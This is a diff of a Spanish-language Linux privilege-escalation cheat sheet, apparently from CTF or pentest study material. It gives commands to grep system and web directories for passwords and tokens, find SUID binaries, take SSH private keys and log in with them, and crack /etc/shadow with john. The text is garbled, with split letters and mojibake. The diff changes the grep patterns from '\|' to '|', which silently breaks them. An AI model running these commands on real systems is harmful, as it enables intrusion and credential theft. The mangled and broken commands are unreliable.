@@ -18,7 +18,7 @@ find / -writable -type d 2>/dev/null | head
 find / -perm -2 -type d 2>/dev/null | grep -v proc | head
 # Archivos interesantes
 ls -la /root/ /home/*/ 2>/dev/null
-grep -R "password\|secret\|token" -n /etc 2>/dev/null | head
+grep -R "password|secret|token" -n /etc 2>/dev/null | head
 NO T ASi t e atascas, lanza LinPEA S desde /tmp: r ecorr e sist emÃ¡ticament e t odos est os v ect or es y r esalta los hallaz gos mÃ¡s 
 pr omet edor es.R ut a A : B inarios SUID â†’ G TF OB insfind / -perm -4000 -type f 2>/dev/null
 # B usca el binario resultante ( vim , find , bash , less , tar , cp , awk , perl ,
@@ -55,7 +55,7 @@ find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
 cat id_rsa # copiar tal cual, incluidas lineas BEGIN/END
 chmod 600 id_rsa
 ssh -i id_rsa usuario@IP# Configs con secreto s
-grep - R "password \| passwd \| secret \| token" -n /opt /var/www /home /etc \
+grep - R "password | passwd | secret | token" -n /opt /var/www /home /etc \
  2>/dev/null | head
 # Crackear /etc/shadow si es legibl e
 john --wordlist = /usr/share/wordlists/rockyou . t x t hashes . t xt
